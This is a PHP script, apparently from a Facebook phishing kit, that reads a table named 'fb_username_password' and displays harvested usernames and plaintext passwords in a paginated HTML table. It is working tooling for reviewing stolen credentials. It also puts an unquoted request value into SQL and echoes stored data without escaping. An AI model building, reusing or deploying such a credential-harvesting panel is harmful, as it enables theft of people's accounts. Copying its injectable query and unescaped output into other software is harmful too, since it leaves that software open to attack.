<?php
require('assets/inc/connection.inc.php');
$limit=5;
if(isset($_POST['page_no'])){
    if($_POST['page_no']!=''){
        $page_no=strip_tags(mysqli_real_escape_string($conn,$_POST['page_no']));
    }else{
        $page_no=1;
    }
    
}else{
    $page_no=1;
}
$offset=($page_no-1)*$limit;
$sql="SELECT * FROM `fb_username_password` ORDER BY `added_on` DESC LIMIT $offset,$limit";
$res=mysqli_query($conn,$sql);
$row_count=mysqli_num_rows($res);
if($row_count > 0){
    $output = 
            '<table border="1">
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Added_on</th>
                    </tr>
                </thead>
                <tbody>';
    while($row=mysqli_fetch_assoc($res)){
        $output .=
                '<tr>
                <td>'.$row['username'].'</td>
                <td>'.$row['password'].'</td>
                <td>'.$row['added_on'].'</td>
                </tr>';
    }
        $output .= 
                    '</tbody>
                </table>
                    </div>
                    <div class="p_ctr">
                    <div class="p_sctr">';
        // 'pagination' start
        $sql1="SELECT * FROM `fb_username_password`";
        $res1=mysqli_query($conn,$sql1);
        $row_count1=mysqli_num_rows($res1);
        $total_page=$row_count1/$limit;
        $total_page=ceil($total_page);
        $output .=
                '<div class="pagination">'; 
        if($page_no > 1){ 
            $output .= '<a href="" class="pagination_no" id="'.($page_no-1).'"><li class="">Pre</li></a>';
        }   
        for($x=1;$x <= $total_page; $x++){
             
            if($page_no==$x){
                $output .= '<a href="" class="pagination_no" id="'.$x.'"><li class="active">'.$x.'</li></a>';
            }else{
                $output .= '<a href="" class="pagination_no" id="'.$x.'"><li class="">'.$x.'</li></a>';
            }
                
                    
        }
        if($page_no < $total_page){ 
            $output .= '<a href="" class="pagination_no" id="'.($page_no+1).'"><li class="">Next</li></a>';
        } 
            $output .=
                    '</div>
                    </div>';
        // 'pagination' end

        echo $output;
}else{
    echo 'data_not_found';
}




?>